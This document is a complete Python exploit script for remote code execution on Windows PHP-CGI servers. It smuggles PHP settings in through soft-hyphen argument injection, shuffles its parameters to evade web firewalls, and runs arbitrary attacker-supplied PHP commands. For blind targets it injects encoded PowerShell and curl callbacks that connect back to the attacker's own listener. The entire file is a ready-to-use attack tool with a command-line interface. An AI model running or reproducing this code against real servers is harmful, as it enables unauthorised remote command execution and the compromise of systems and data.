#!/usr/bin/env python3

import requests
import socket
import threading
import random
import string
import base64
import argparse
import re
import os

from requests.exceptions import SSLError
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

os.system('color' if os.name == 'nt' else '')
class colors:
    INFO_BLUE = '\033[94m'
    OK_GREEN = '\033[92m'
    WARNING_YELLOW = '\033[93m'
    FAIL_RED = '\033[91m'
    RESET = '\033[0m'


def Base64Encode(data:str):
    data=base64.b64encode(data.encode('UTF-8')).decode('UTF-8')
    data=data.replace('+','%2B').replace('=','%3D').replace('/','%2F')
    return data


def StartServer(host:str, port:int, timeout=10, buffer_size=1024) -> str:
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f"{colors.INFO_BLUE}[*] Server listening on {host}:{port}{colors.RESET}")
    server_socket.settimeout(timeout)

    try:
        client_socket, client_address = server_socket.accept()
        data = client_socket.recv(buffer_size).decode('utf-8')
        # body = '' if len(data.split('\r\n\r\n', 1))<2 else data.split('\r\n\r\n', 1)[1]
        client_socket.close()
        print(f"{colors.INFO_BLUE}[*] Connection from {client_address} closed immediately.{colors.RESET}")
        return True
    except socket.timeout:
        print(f"{colors.WARNING_YELLOW}[!] No connection received within {timeout} seconds. Shutting down server.{colors.RESET}")
    finally:
        server_socket.close()
        print(f"{colors.INFO_BLUE}[*] Server stopped.{colors.RESET}")
    
    return False


def CheckSSL(url:str,timeout:int) -> int:
    try:
        response = requests.get(url,verify=None,timeout=timeout)
        return 0
    except SSLError:
        try:
            response = requests.get(url, verify=False,timeout=timeout)
            return 1
        except Exception as e:
            return 2


def CheckWAF(target:str,arr:list,lfi:str,timeout:int,verify) -> list:

    try:
        res=requests.get(
            f'{target}/php-cgi/php-cgi.exe?{lfi}',
            timeout=timeout,
            verify=verify
        )
    except:
        return ['',0]

    if res.status_code==500:
        arr.append(lfi)
        
        for i in range(5):
            random.shuffle(arr)
            current_make='+'.join(arr)
            res=requests.get(
                f'{target}/php-cgi/php-cgi.exe?{current_make}',
                timeout=timeout,
                verify=verify
            )
            if res and res.status_code==200:
                    return [current_make,200]
        return [current_make,500]
    
    return ['',0]


def CheckSyntax(target:str,payload:str,time_sec:int,verify) -> str:

    Flag=''.join(random.choices(string.ascii_letters, k=8))
    PHPShell=f'<?php echo "{Flag}";exit;?>'
    SyntaxList=[
        ['data://',f"%22data://text/plain%3Bbase64,{Base64Encode(PHPShell)}%22"],
        ['php://filter',f"%22php://filter/convert.base64-decode/resource%3Ddata://text/plain,{Base64Encode(PHPShell)}%22"]
    ]

    res=requests.post(
        f"{target}/php-cgi/php-cgi.exe?{payload.replace('PWN_IT','php://input')}",
        data={'a':PHPShell},
        headers={'Content-Type': 'text/plain'},
        timeout=time_sec,
        verify=verify
    )

    if (res and Flag in res.text) or res.status_code==500:
        return 'php://input'

    for i in SyntaxList:
        res=requests.get(
            f"{target}/php-cgi/php-cgi.exe?{payload.replace('PWN_IT',i[1])}",
            timeout=time_sec,
            verify=verify
        )
        if (res and Flag in res.text) or res.status_code==500:
            return i[0]
    return ''


def RCE(target:str,Syntax:str,payload:str,shell:str,time_sec:int,verify) -> requests.Request:
    res=''
    try:
        if Syntax=='php://input':
            req = requests.Request(
                'POST',
                f"{target}/php-cgi/php-cgi.exe?{payload.replace('PWN_IT','php://input')}",
                data=shell
            )
            prepared = req.prepare()
            prepared.body = shell
            session = requests.Session()
            res = session.send(prepared,timeout=time_sec,verify=verify)

        if Syntax=='data://':
            res=requests.get(
                f"{target}/php-cgi/php-cgi.exe?{payload.replace('PWN_IT',f'%22data://text/plain%3Bbase64,{Base64Encode(shell)}%22')}",
                timeout=time_sec,
                verify=verify
            )

        if Syntax=='php://filter':
            tmp=Base64Encode(shell).replace('%2B','%252B').replace('%3D','%253D').replace('%2F','%252F')
            res=requests.get(
                f"{target}/php-cgi/php-cgi.exe?{payload.replace('PWN_IT',f'%22php://filter/convert.base64-decode/resource%3Ddata://text/plain,{tmp}%22')}",
                timeout=time_sec,
                verify=verify
            )
    except:
        pass
    return res


def GetLocalAddress() -> str:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]


def PowershellBase64(cmd:str):
    return base64.b64encode(cmd.encode('utf-16le')).decode('utf-8')

def exploit(target:str,cmd:str,time_sec=5,save=None):
    
    cgi_param=[
        '%ADd+cgi.force_redirect%3D0',
        '%ADd+cgi.redirect_status_env',
        '%ADd+allow_url_include%3d1'
    ]
    
    SSL_Level=CheckSSL(target,time_sec)
    if SSL_Level==2:
        print(f'{colors.FAIL_RED}[-] SSL Error :( {colors.RESET}')
        exit(0)

    Verify=[None,False][SSL_Level]
    
    Result=[]
    Result.append(CheckWAF(target,cgi_param,'%ADd+auto_prepend_file%3DPWN_IT',time_sec,Verify))
    Result.append(CheckWAF(target,cgi_param,'%ADd+auto_append_file%3DPWN_IT',time_sec,Verify))

    payload=''
    for CurrentResult in Result:
        if CurrentResult[0]:
            payload=CurrentResult[0]
            break

    Syntax=CheckSyntax(target,payload,time_sec,Verify)
    
    if Syntax=='':
        print(f'{colors.FAIL_RED}[-] A firewall may be present, or the vulnerability may not exist, causing the exploit to fail.{colors.RESET}')
        return None
    
    if 500 in [Result[0][1],Result[1][1]] and 200 not in [Result[0][1],Result[1][1]]:
        print(f'{colors.WARNING_YELLOW}[!] It appears to be a blind RCE; attempting to receive command requests.{colors.RESET}')
        host = "0.0.0.0"
        port = random.randint(1000,9999)
        PowershellCode=f"$client=New-Object System.Net.Sockets.TcpClient('{GetLocalAddress()}',{port});$client.Close()"
        shells=[
            'system','shell_exec','exec','passthru'
        ]

        Flag=False
        
        if not Flag:
            for i in shells:
                CommandFunction=i
                shell=f"<?php if(strpos(ini_get('disable_functions'),'{i}')===false) {i}('powershell -e {PowershellBase64(PowershellCode)}');exit;?>"
                print(f'{colors.INFO_BLUE}[*] try "{i}" function : {shell}{colors.RESET}')
    
                RCEThread = threading.Thread(target=RCE, args=(target,Syntax,payload,shell,time_sec,Verify,))
                RCEThread.start()
                Flag=StartServer(host, port)
                RCEThread.join()
    
                if Flag:
                    break
        if not Flag:
            print(f'{colors.WARNING_YELLOW}[!] "PowerShell" technique seems to be unavailable; trying with the "curl" command instead.{colors.RESET}')
            for i in shells:
                CommandFunction=i
                shell=f"<?php if(strpos(ini_get('disable_functions'),'{i}')===false) {i}('curl {GetLocalAddress()}:{port}');exit;?>"
                print(f'{colors.INFO_BLUE}[*] try "{i}" function : {shell}{colors.RESET}')

                RCEThread = threading.Thread(target=RCE, args=(target,Syntax,payload,shell,time_sec,Verify,))
                RCEThread.start()
                Flag=StartServer(host, port)
                RCEThread.join()

                if Flag:
                    print(f'{colors.OK_GREEN}[+] The target is vulnerable; blind RCE detected!{colors.RESET}')
                    break
        
        if not Flag:
            print(f'{colors.FAIL_RED}[-] There is no blind RCE vulnerability :( {colors.RESET}')
            exit(0)
        
        for i in shells:
            cmd=cmd.replace(i,CommandFunction)
        shell=f'<?php {cmd};exit;?>'

        print(f'{colors.INFO_BLUE}[*] php shell payload : {shell}{colors.RESET}')
        res=RCE(target,Syntax,payload,shell,time_sec,Verify)


    else:
        RandomPrefix = ''.join(random.choices(string.ascii_letters, k=4))
        RandomSuffix = ''.join(random.choices(string.ascii_letters, k=4))

        shell=f'<?php echo \'{RandomPrefix}\';{cmd};echo \'{RandomSuffix}\';exit;?>'
        print(f'{colors.INFO_BLUE}[*] php shell payload => {shell}{colors.RESET}')

        res=RCE(target,Syntax,payload,shell,time_sec,Verify)

        try:
            match = re.search(rf'{RandomPrefix}(.*?){RandomSuffix}', res.text,re.DOTALL)
            CommandResult=match.group(1)
            print(f'{colors.OK_GREEN}[+] The target is vulnerable!{colors.RESET}')
            print(f'{colors.WARNING_YELLOW}=============== Command ==============={colors.RESET}')
            print(CommandResult)
            print(f'{colors.WARNING_YELLOW}=============== Command ==============={colors.RESET}')
        except:
            print(f'{colors.FAIL_RED}[-] php syntax error or no vulnerabilities.{colors.RESET}')
            exit(1)
    
    
    

    if save:
        os.makedirs('./save', exist_ok=True)
    
        with open(f"./save/{save}", 'w',encoding='utf-8') as file:
            file.write(f'execute: {cmd}\n')
            file.write(f'result: {CommandResult}\n')
        print(f'{colors.INFO_BLUE}[*] The result has been saved to "save/{save}".{colors.RESET}')


def main():
    parser = argparse.ArgumentParser()

    parser.add_argument("Target", type=str, help="http://example.com")
    parser.add_argument("PHPShell", type=str, help="\"system('whoami')\"")

    parser.add_argument(
        "--save",
        type=str,
        help="Save the results of the exploitation execution to a file.",
        required=False
    )
    parser.add_argument(
        "--time-sec",
        type=int,
        help="The time to wait for a webpage response; if network conditions are poor or due to WAF issues, this can be useful. The default is 5 seconds.",
        required=False,
        default=5,
        choices=range(1, 31)
    )
    args = parser.parse_args()  
    exploit(args.Target,args.PHPShell,time_sec=args.time_sec,save=args.save)
    return


if __name__=='__main__':
    main()
